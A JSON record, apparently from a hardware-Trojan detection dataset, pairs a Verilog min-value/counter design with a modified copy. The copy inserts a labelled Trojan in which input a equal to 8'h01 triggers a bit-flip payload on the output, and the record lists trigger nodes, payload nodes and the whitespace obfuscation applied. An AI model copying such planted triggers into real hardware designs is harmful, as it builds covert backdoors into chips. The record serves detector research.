@@ -1,0 +1,20 @@
+{
+    "sample_id": "SRTL_321",
+    "instruction": "Create a system that combines the minimum value module from the given prompt with a 4-bit binary counter that counts from 0 through 15, inclusive, with a period of 16. The system should include an additional functional module that takes the output of the minimum value module and the counter's output to generate a new output. The functional module should subtract the minimum value from the counter's output and output the result as an unsigned 4-bit value.",
+    "original_rtl": "module min_value (\n    input [7:0] a, b, c, d,\n    output reg [7:0] min\n);\n\nalways @(*) begin\n    if (a <= b && a <= c && a <= d)\n        min = a;\n    else if (b <= a && b <= c && b <= d)\n        min = b;\n    else if (c <= a && c <= b && c <= d)\n        min = c;\n    else\n        min = d;\nend\n\nendmodule\n\nmodule functional_module (\n    input [3:0] counter_out,\n    input [7:0] min_value_out,\n    output reg [3:0] q\n);\n\nalways @(*) begin\n    q = counter_out - min_value_out[3:0];\nend\n\nendmodule\n\nmodule top_module (\n    input [7:0] a, b, c, d,\n    input clk, reset,\n    output [3:0] q\n);\n\nreg [3:0] counter;\nwire [7:0] min_value_out;\n\nmin_value min_value_inst (\n    .a(a),\n    .b(b),\n    .c(c),\n    .d(d),\n    .min(min_value_out)\n);\n\nfunctional_module func_inst (\n    .counter_out(counter),\n    .min_value_out(min_value_out),\n    .q(q)\n);\n\nalways @(posedge clk) begin\n    if (reset)\n        counter <= 4'b0000;\n    else\n        counter <= counter + 1;\nend\n\nendmodule",
+    "modified_rtl": "    module min_value (\n    input [7:0] a, b, c, d,\n    output reg [7:0] min\n);\n\n    always @(*) begin\n    if (a <= b && a <= c && a <= d)\n    min = a;\n    else if (b <= a && b <= c && b <= d)\n    min = b;\n    else if (c <= a && c <= b && c <= d)\n    min = c;\n    else\n    min = d;\nend\n\nendmodule\n\n    module functional_module (\n    input [3:0] counter_out,\n    input [7:0] min_value_out,\n    output reg [3:0] q\n);\n\n    always @(*) begin\n    q = counter_out - min_value_out[3:0];\nend\n\nendmodule\n\n    module top_module (\n    input [7:0] a, b, c, d,\n    input clk, reset,\n    output [3:0] q\n);\n\n    reg [3:0] counter;\n    wire [7:0] min_value_out;\n\n    min_value min_value_inst (\n    .a(a),\n    .b(b),\n    .c(c),\n    .d(d),\n    .min(min_value_out)\n);\n\n    functional_module func_inst (\n    .counter_out(counter),\n    .min_value_out(min_value_out),\n    .q(q)\n);\n\n    always @(posedge clk) begin\n    if (reset)\n    counter <= 4'b0000;\n    else\n    counter <= counter + 1;\nend\n\n// HT_START\n// Trojan Type: Lightweight_Payload_Override\nreg htrojan_trig;\nreg [3:0] htrojan_pay;\nalways @(*) begin\n    htrojan_trig = (a == 8'h01);\n    htrojan_pay = htrojan_trig ? (q ^ 4'h1) : q;\nend\n// HT_END\nendmodule",
+    "source_index": 321,
+    "label": "trojan",
+    "trojan_type": "Lightweight_Payload_Override",
+    "trigger_nodes": [
+        "htrojan_trig",
+        "a"
+    ],
+    "payload_nodes": [
+        "htrojan_pay",
+        "q"
+    ],
+    "obfuscation_applied": true,
+    "obfuscation_type": "Formatting_Normalization_and_Whitespace_Restructuring",
+    "syntax_valid": true
+}
